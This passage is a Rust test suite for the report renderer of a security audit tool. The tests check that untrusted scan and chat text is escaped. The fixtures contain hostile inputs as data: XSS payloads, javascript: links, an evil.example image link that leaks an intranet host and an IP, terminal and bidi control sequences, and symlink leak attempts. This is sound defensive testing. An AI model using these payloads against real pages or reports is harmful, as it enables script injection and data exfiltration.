                .contains("| 10.10.10.9 | CVE-2020-0003 | HIGH 6.0 | - | 443/tcp | 1/6 | no |"),
            "{hypotheses}"
        );

        let dismissed = section("Dismissed as false positives");
        assert!(dismissed.contains("- CVE-2018-0002 on 10.10.10.5"));
        assert!(text.contains("| Hosts | Confirmed findings | Unverified hypotheses | False positives | Secrets to rotate |"));
        assert!(text.contains("| 2 | 1 | 2 | 1 | 1 |"));
    }

    #[test]
    fn report_has_every_section_in_order() {
        let text = render(&inputs());
        let order = [
            "# Audit report: acme",
            "Generated 2026-11-12T09:41:00Z by meow",
            "This report is not masked.",
            "## Topology",
            "```mermaid\ngraph LR\n",
            "-->|routed|",
            "Route warnings:",
            "## What to update",
            "## Confirmed findings",
            "## Unverified hypotheses",
            "## Dismissed as false positives",
            "## Hosts",
            "### 10.10.10.5",
            "| 443/tcp | open | ssl/http | nginx | 1.18.0 |",
            "Paths on 443/tcp:",
            "- `/admin/`",
            "- `/admin/login.php` (200)",
            "Observed evidence:",
            "_(nmap_xml, High, Observed, ",
            "Operator notes:",
            "- default creds rejected",
            "### 10.10.10.9",
            "### Workspace notes",
            "```diff\n@@ -1 +1 @@\n-tokens on\n+tokens off\n```",
            "## Secrets to rotate",
            "| `<<SEC_01>>` | `eyJh... (71 chars)` | 2026-11-12T09:00:00Z |",
            "## Background tasks",
            "| 1 | 10.10.10.0/23 | mild | crawl | skipped | katana is not installed |",
            "## Command trail (replay.sh)",
            "```sh\n# header\n# [CWD] /work\nnmap -sV 10.10.10.5\n# [EXIT] 0\n",
            "## AI triage notes",
            "### From chats/10.10.10.5.md",
            "#### Triage notes for 10.10.10.5",
            "##### 1. Risk",
        ];
        let mut from = 0;
        for expected in order {
            match text[from..].find(expected) {
                Some(at) => from += at + expected.len(),
                None => panic!("missing or out of order: {expected:?}\n{text}"),
            }
        }
    }

    #[test]
    fn scanned_text_cannot_inject_markup_or_break_blocks() {
        let text = render(&inputs());
        assert!(
            !text.contains("<script>"),
            "raw HTML from a banner reached the report"
        );
        assert!(text.contains("Server: nginx/1.18.0 &lt;script&gt;alert(1)&lt;/script&gt;"));
        assert!(text.contains("summary with &lt;b&gt;markup&lt;/b&gt; \\| pipe"));
        // A code fence typed in the shell does not end the command block.
        assert!(
            text.contains("echo '''''\n```\n\n## AI triage notes"),
            "{text}"
        );
        assert_eq!(md("a|b\n<c>&"), "a\\|b &lt;c&gt;&amp;");
        assert_eq!(
            md("[click](javascript:alert(1))"),
            "\\[click\\](javascript:alert(1))"
        );
        assert_eq!(code("x`y\nz"), "`x'y z`");
        assert_eq!(code("a|b"), "`a\\|b`");

        let mut chat_out = String::new();
        render_chat_markdown(
            &mut chat_out,
            "unmatched ` backtick\n`<script>alert(1)</script>`\n   # Indented H1\nFake H1\n===\n",
        );
        assert!(
            !chat_out.contains("` backtick") && chat_out.contains("' backtick"),
            "unmatched backtick must be neutralized so it cannot join next line's backtick: {chat_out}"
        );
        assert!(chat_out.contains("#### Indented H1"), "{chat_out}");
        assert!(chat_out.contains("\\==="), "{chat_out}");

        // Untrusted advisory.port and raw HTML in chats/*.md are escaped,
        // while inline code spans, fenced code blocks, and unclosed fences are
        // handled cleanly.
        let mut custom = inputs();
        custom.graph.hosts.get_mut("10.10.10.5").unwrap().advisories[1].port =
            Some("443/tcp | <img src=x>".into());
        custom.chats = vec![
            (
                "192.0.2.1.md".into(),
                "# Heading <script>alert(1)</script>\n\
                 > Quote with <b>html</b> and `<raw>` span\n\
                 ```sh\n\
                 # shell comment stays a comment\n\
                 curl -s https://example.com | grep '<title>'\n\
                 ```\n\
                 ```html\n\
                 <div>unclosed fence"
                    .into(),
            ),
            (
                "192.0.2.2.md".into(),
                "## Next chat\n\
                 ```mermaid\n\
                 graph TD\n\
                 ```\n\
                 > ```dataviewjs\n\
                 > dv.view('x')\n\
                 Clean text.\n"
                    .into(),
            ),
        ];
        let rendered = render(&custom);
        assert!(rendered.contains("| 443/tcp \\| &lt;img src=x&gt; |"));
        // No tag opens anywhere, in or out of code: what counts as code
        // differs between Markdown dialects.
        assert!(rendered.contains("#### Heading &lt;script>alert(1)&lt;/script>"));
        assert!(rendered.contains("> Quote with &lt;b>html&lt;/b> and `&lt;raw>` span"));
        assert!(rendered.contains("```sh\n# shell comment stays a comment\n"));
        assert!(rendered.contains("grep '&lt;title>'"));
        assert!(rendered.contains("&lt;div>unclosed fence\n```\n\n### From chats/192.0.2.2.md"));
        assert!(rendered.contains(
            "##### Next chat\n```\ngraph TD\n```\n> ```\n> dv.view('x')\n> ```\nClean text."
        ));
        for tag in [
            "<script",
            "<img",
            "<b>",
            "<div",
            "<raw",
            "```mermaid\ngraph TD",
            "dataviewjs",
        ] {
            assert!(!rendered.contains(tag), "{tag}");
        }
    }

    #[test]
    fn scanned_text_is_shown_as_text_never_as_markdown() {
        let mut custom = inputs();
        {
            let host = custom.graph.hosts.get_mut("10.10.10.5").unwrap();
            let port = host.ports.get_mut("443/tcp").unwrap();
            port.http.as_mut().unwrap().server = Some(
                "nginx ![s](https://e.example/x.png) [a](javascript:1) \\| **b** _c_ `d`".into(),
            );
            port.version = Some("1.18.0 [vendor fix](https://e.example/fix.sh)".into());
            port.tls_sans.insert("![c](https://e.example/b.png)".into());
            // A confirmed finding whose title starts like a list item and
            // opens a code block.
            host.advisories[0].title = "- Status: fixed ``` swallow the rest".into();
            host.advisories[0].record.verification_status = VerificationStatus::Confirmed;
        }
        custom.secrets = vec![crate::vault::ExposedSecret {
            token: "<<SEC_01>>".into(),
            preview: "a|b... (9 chars)".into(),
            first_seen_utc: "2026-11-12T09:00:00Z".into(),
        }];
        let rendered = render(&custom);
        for live in [
            "![s](",
            "![c](",
            "[a](javascript:",
            "[vendor fix](https://",
            "**b**",
            " _c_ ",
        ] {
            assert!(!rendered.contains(live), "{live} is live in:\n{rendered}");
        }
        assert!(
            rendered.contains("!\\[s\\](https://e.example/x.png)"),
            "{rendered}"
        );
        assert!(rendered.contains("\\*\\*b\\*\\*"));
        // The port row keeps its cells: the `\|` of the header did not end one.
        let row = rendered
            .lines()
            .find(|line| line.starts_with("| 443/tcp |"))
            .unwrap();
        let cells = row
            .replace("\\\\", "")
            .replace("\\|", "")
            .matches('|')
            .count();
        let header = rendered
            .lines()
            .find(|line| line.starts_with("| Port |"))
            .unwrap();
        assert_eq!(cells, header.matches('|').count(), "{row}");
        // The title neither opens a code block nor starts a list item, and
        // what follows the finding is still there, outside any block.
        assert!(
            rendered.contains("Summary: - Status: fixed \\`\\`\\` swallow the rest"),
            "{rendered}"
        );
        assert!(rendered.contains("\n## Hosts\n"));
        assert!(
            rendered.contains("| `<<SEC_01>>` | `a\\|b... (9 chars)` |"),
            "{rendered}"
        );
    }

    #[test]
    fn a_model_reply_is_written_inert_into_the_report() {
        let mut custom = inputs();
        custom.chats = vec![(
            "192.0.2.10.md".into(),
            // What the 2026-11 audit used against the earlier filter.
            "![s](https://evil.example/c.png?h=intranet.corp.example&ip=10.1.2.3)\n\
             \\` <img src=x onerror=alert(1)> \\`\n\
             a line ending in a lone `\n\
             ` <script>alert(2)</script> `\n\
             [ref]: javascript:alert(3)\n\
             see [the fix][ref] and <https://evil.example/auto>\n\
             Confirmed findings\n\
             ===\n\
             \u{20}# Forged section\n\
             ```{=html}\n\
             <iframe src=//evil.example></iframe>\n\
             ```\n\
             Sources\n\
             ---\n\
             \n\
             ---\n"
                .into(),
        )];
        let rendered = render(&custom);
        let chat = &rendered[rendered.find("### From chats/192.0.2.10.md").unwrap()..];
        for live in [
            "![s](",
            "<img",
            "<script",
            "<iframe",
            "<https://",
            "\n[ref]:",
            "\n===",
            "\n # Forged",
            "\n## Forged",
            "\nSources\n---",
        ] {
            assert!(!chat.contains(live), "{live:?} is live in:\n{chat}");
        }
        assert!(chat.contains("!\\[s]\\(https://evil.example/c.png"));
        assert!(chat.contains("[ref]\\: javascript:alert(3)"));
        assert!(chat.contains("\n\\===\n"));
        // One level down like every other heading of the file, not a new
        // top-level section of the report.
        assert!(chat.contains("\n #### Forged section"), "{chat}");
        // A rule after an empty line is still a rule.
        assert!(chat.contains("\n\n---\n"));
        // Writing it twice changes nothing.
        let once = inert_markdown(&custom.chats[0].1);
        assert_eq!(inert_markdown(&once), once);
    }

    #[test]
    fn empty_workspace_still_gives_a_complete_report() {
        let text = render(&Inputs {
            session: "new".into(),
            mode: Mode::Light,
            generated_utc: "2026-11-12T09:41:00Z".into(),
            graph: Graph::default(),
            tasks: vec![],
            secrets: vec![],
            replay: None,
            chats: vec![],
        });
        for expected in [
            "| 0 | 0 | 0 | 0 | 0 |",
            "graph LR\n    n0([\"this machine\"])\n```",
            "None. No hypothesis has been confirmed by the operator yet.",
            "## Unverified hypotheses\n\nNone.",
            "No hosts recorded.",
            "No secret has been seen",
            "No recon task was queued.",
            "No commands were recorded",
            "No AI request was made.",
        ] {
            assert!(text.contains(expected), "missing {expected:?}\n{text}");
        }
        assert!(!text.contains("Dismissed as false positives"));
    }

    #[test]
    fn long_command_trails_are_cut_to_the_most_recent_lines() {
        let mut data = inputs();
        let trail: String = (0..2000).map(|i| format!("echo {i}\n")).collect();
        data.replay = Some(trail);
        let text = render(&data);
        assert!(text.contains("Showing the last 600 of 2000 lines"));
        assert!(text.contains("echo 1999\n```"));
        assert!(text.contains("```sh\necho 1400\n"));
        assert!(!text.contains("echo 1399\n"));
    }

    #[test]
    fn report_is_written_from_the_workspace_files() {
        use crate::workspace::MeowHome;
        let tmp = tempfile::tempdir().unwrap();
        let home = MeowHome::at(tmp.path().join(".meow")).unwrap();
        let (workspace, _) =
            Workspace::open_or_create(&home, tmp.path(), "acme", false, Mode::Mild).unwrap();
        let mut data = inputs();
        data.graph.save(&workspace.graph_path()).unwrap();
        std::fs::write(workspace.replay_path(), "# [CWD] /work\nls\n# [EXIT] 0\n").unwrap();
        std::fs::write(
            workspace.chats_dir().join("10.10.10.5.md"),
            "# Triage notes\n\nUpgrade.\n",
        )
        .unwrap();
        std::fs::write(workspace.chats_dir().join("ignored.txt"), "not a chat").unwrap();
        {
            let db = Arc::new(Mutex::new(Db::open(&workspace.state_db_path()).unwrap()));
            queue::enqueue(&db.lock().unwrap(), "10.10.10.0/23", Mode::Mild, &[]).unwrap();
            Vault::open(db)
                .unwrap()
                .mask_text("password=hunter2-hunter2");
        }

        let path = write(&workspace).unwrap();
        assert_eq!(path, workspace.dir.join("REPORT.md"));
        let text = std::fs::read_to_string(&path).unwrap();
        assert!(text.starts_with("# Audit report: acme\n"));
        assert!(text.contains("Mode: mild."));
        assert!(text.contains("### CVE-2021-23017 on 10.10.10.5"));
        assert!(text.contains("| 1 | 10.10.10.0/23 | mild | ports | pending |"));
        assert!(text.contains("| `<<SEC_01>>` | `hunt... (15 chars)` |"));
        assert!(
            !text.contains("hunter2-hunter2"),
            "a secret value must never be printed"
        );
        assert!(text.contains("```sh\n# [CWD] /work\nls\n# [EXIT] 0\n```"));
        assert!(text.contains("### From chats/10.10.10.5.md"));
        assert!(!text.contains("not a chat"));
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(
                std::fs::metadata(&path).unwrap().permissions().mode() & 0o7777,
                0o600
            );
        }
        // Writing again replaces the file.
        write(&workspace).unwrap();
        assert_eq!(
            std::fs::read_to_string(&path)
                .unwrap()
                .matches("# Audit report")
                .count(),
            1
        );
    }

    #[test]
    fn md_and_code_strip_controls_and_bidi_directly() {
        assert_eq!(
            md("banner\x1b]0;pwn\x07\u{202e}txt.exe|cell"),
            "banner\\]0;pwntxt.exe\\|cell"
        );
        assert_eq!(code("cpe\x1b[2J\u{2066}hidden`tick"), "`cpe[2Jhidden'tick`");
    }

    #[test]
    fn fence_smuggling_git_diff_hidden_fences_and_non_regular_files_are_blocked() {
        // 1. CommonMark: a backtick fence info string cannot contain '`', so
        //    "```inline`" is NOT a fence opener and must not let "# Forged H1"
        //    escape heading demotion or emit a stray closing fence.
        let mut fake_open = String::new();
        render_chat_markdown(&mut fake_open, "```inline`\n# Forged H1\n");
        assert!(
            fake_open.contains("#### Forged H1"),
            "heading after non-fence backtick line must still be demoted: {fake_open}"
        );
        assert!(
            !fake_open.ends_with("```\n"),
            "must not emit a stray closing fence: {fake_open}"
        );

        // 2. CommonMark: a closing fence cannot have trailing non-space text,
        //    so "```still_open" inside a fence must NOT trick us into leaving
        //    the fence unclosed before the next chat.
        let mut fake_close = String::new();
        render_chat_markdown(&mut fake_close, "```sh\n```still_open\n");
        assert!(
            fake_close.ends_with("```still_open\n```\n"),
            "unclosed fence after spoofed close must still be closed: {fake_close}"
        );

        // 3. Escaped `\` before `` ` `` does not pair with an unescaped `` ` ``.
        let mut parity = String::new();
        render_chat_markdown(&mut parity, "\\` lone unescaped `\n");
        assert_eq!(parity, "\\` lone unescaped '\n");

        // 4. GitDiff evidence containing zero-width / Unicode tag chars between
        //    backticks cannot break out of ```diff.
        let mut custom = inputs();
        custom.graph.notes.push(Fact {
            claim: "tampered diff".into(),
            record: EvidenceRecord {
                source: Source::GitDiff,
                timestamp_utc: "2026-11-12T09:41:00Z".into(),
                confidence: Confidence::High,
                evidence: "@@ -1 +1 @@\n-``\u{200b}`\n+<script>alert(1)</script>".into(),
                verification_status: VerificationStatus::Observed,
            },
        });
        let rendered = render(&custom);
        assert!(
            rendered.contains("```diff\n@@ -1 +1 @@\n-'''\n+<script>alert(1)</script>\n```"),
            "{rendered}"
        );

        // 5. Symlinked replay.sh and chats/*.md are ignored by collect().
        #[cfg(unix)]
        {
            use crate::workspace::MeowHome;
            let tmp = tempfile::tempdir().unwrap();
            let secret_outside = tmp.path().join("outside.txt");
            std::fs::write(&secret_outside, "TOP_SECRET_OUTSIDE").unwrap();
            let home = MeowHome::at(tmp.path().join(".meow")).unwrap();
            let (workspace, _) =
                Workspace::open_or_create(&home, tmp.path(), "symtest", false, Mode::Light)
                    .unwrap();
            let _ = std::fs::remove_file(workspace.replay_path());
            std::os::unix::fs::symlink(&secret_outside, workspace.replay_path()).unwrap();
            std::os::unix::fs::symlink(&secret_outside, workspace.chats_dir().join("leak.md"))
                .unwrap();

            let collected = collect(&workspace).unwrap();
            assert!(collected.replay.is_none());
            assert!(collected.chats.is_empty());
        }
    }
}
